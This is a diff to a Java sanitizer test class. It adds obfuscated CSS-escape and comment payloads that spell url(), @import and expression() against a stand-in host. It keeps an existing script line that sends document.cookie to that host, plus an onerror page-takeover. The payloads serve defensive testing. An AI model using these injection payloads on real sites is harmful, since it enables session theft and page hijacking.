@@ -47,7 +47,15 @@ class SafeHtmlAttackTests {
 		"<p>texto</p><script>fetch('https://malicioso.test/'+document.cookie)</script>",
 		"<img src=x onerror=\"parent.document.body.innerHTML='tomado'\">",
 		"</style><script>alert(1)</script><p>ok</p>",
-		"<div style=\"position:fixed;inset:0;background:url(https://malicioso.test/pixel)\">capa</div>"
+		"<div style=\"position:fixed;inset:0;background:url(https://malicioso.test/pixel)\">capa</div>",
+		// CSS escapes and comments spelling a forbidden name.
+		"<style>div{background:\\75rl(https://malicioso.test/x)}</style><p>ok</p>",
+		"<style>div{background:\\u\\r\\l(https://malicioso.test/x)}</style><p>ok</p>",
+		"<p style=\"background:\\000075\\72 \\6c(https://malicioso.test/p)\">ok</p>",
+		"<style>@\\69mport \"https://malicioso.test/x.css\";</style><p>ok</p>",
+		"<style>div{width:expr/**/ession(alert(1))}</style><p>ok</p>",
+		"<style>div{width:\\65xpression(alert(1))}</style><p>ok</p>",
+		"<style>div{background:image-set(\"https://malicioso.test/x.png\" 1x)}</style><p>ok</p>"
 	);
 
 	@Test
@@ -74,6 +82,14 @@ class SafeHtmlAttackTests {
 			assertThat(checked.contains("@import") || checked.contains("expression("))
 				.as("css perigoso em: %s", payload).isFalse();
 		}
+	}
+
+	/** Escapes that do not spell a name (quotes in `content`) stay as the author wrote them. */
+	@Test
+	void keepsNonNameCssEscapes() {
+		String clean = SafeHtml.sanitizePageHtml("<style>q::before{content:\"\\201C\"}</style><q>ok</q>");
+
+		assertThat(clean).contains("content:\"\\201C\"");
 	}
 
 	/** Links: alvo e `rel` sao definidos por nos; o autor nao escolhe navegar a aba de cima. */
